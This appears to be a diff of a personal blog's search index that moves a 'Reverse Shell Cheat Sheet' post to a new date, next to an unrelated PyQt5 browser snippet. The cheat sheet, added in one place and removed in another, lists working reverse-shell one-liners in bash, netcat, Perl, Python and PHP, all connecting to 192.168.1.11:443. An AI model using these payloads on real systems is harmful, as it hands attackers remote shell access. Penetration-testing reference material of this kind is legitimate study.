@@ -1,6 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
+    <url>%2F2018%2F03%2F20%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
+    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
+      <categories>
+        <category>shell</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>bash</tag>
+        <tag>perl</tag>
+        <tag>netcat</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Python PyQt5]]></title>
     <url>%2F2018%2F03%2F07%2FPython%E5%AE%9E%E7%94%A8%2F</url>
     <content type="text"><![CDATA[使用Python3，PyQt5实现简易浏览器from PyQt5.QtWidgets import QApplication from PyQt5.QtWebEngineWidgets import QWebEngineView from PyQt5.QtCore import QUrl app = QApplication([]) view = QWebEngineView() view.load(QUrl(&quot;https://translate.google.cn&quot;)) view.show() app.exec_()]]></content>
@@ -97,21 +112,6 @@
         <tag>kali</tag>
         <tag>NVIDIA</tag>
         <tag>驱动</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
-    <url>%2F2018%2F01%2F10%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
-    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
-      <categories>
-        <category>shell</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>bash</tag>
-        <tag>perl</tag>
-        <tag>netcat</tag>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
